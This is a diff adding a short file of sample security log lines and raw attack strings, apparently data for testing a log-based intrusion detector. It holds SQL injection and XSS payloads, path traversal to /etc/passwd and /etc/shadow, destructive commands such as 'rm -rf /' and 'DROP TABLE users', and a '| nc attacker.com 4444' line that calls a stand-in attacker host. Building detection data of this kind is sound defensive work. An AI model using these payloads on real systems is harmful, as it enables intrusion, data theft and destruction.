@@ -1,0 +1,50 @@
+GET /products?id=101' OR '1'='1' -- 200
+2024-11-19 09:01:05 WARN Failed login attempt for user 'admin' from IP 192.168.1.50 (repeated 100 times in 10 seconds)
+GET /search?q=<script>alert('XSS')</script> 200
+GET /view_file?name=../../../../etc/passwd 403
+INFO Database Query: SELECT * FROM credit_cards (Rows returned: 1,000,000)
+' OR 1=1 --
+admin' --
+SELECT * FROM users WHERE id='1' OR '1'='1'
+Failed login attempt
+Invalid password
+Failed login attempt from IP 192.168.1.10
+Multiple login failures detected
+<script>alert('XSS')</script>
+../../etc/passwd
+%00%00%00
+DROP TABLE users;
+; rm -rf /
+&& shutdown -h now
+| cat /etc/passwd
+Failed login attempt from IP 192.168.1.16
+SELECT * FROM users WHERE id='0' OR '0'='0'
+../../../windows/system32
+<iframe src='evil.com'></iframe>
+INFO Database Query: SELECT * FROM debit_cards (Rows returned: 500,000)
+' OR 'a'='a
+" OR ""="
+1' OR '1'='1' --
+SELECT password FROM admin WHERE username='admin'
+INSERT INTO users VALUES('hack','hack')
+Failed login attempt for admin
+Invalid credentials from IP 10.0.0.5
+Too many login attempts detected
+User authentication failed repeatedly
+Password mismatch error
+<script>document.cookie</script>
+<img src=x onerror=alert(1)>
+javascript:alert('Hacked')
+<svg onload=alert('XSS')>
+../../../../etc/shadow
+..\..\windows\system32\cmd.exe
+/etc/passwd
+C:\Windows\System32\drivers\etc\hosts
+Port scan detected from IP 203.0.113.5
+Multiple requests to /admin panel
+Access denied to restricted endpoint /root
+Unusual traffic spike detected
+&& whoami
+| nc attacker.com 4444
+`cat /etc/passwd`
+; ls -la
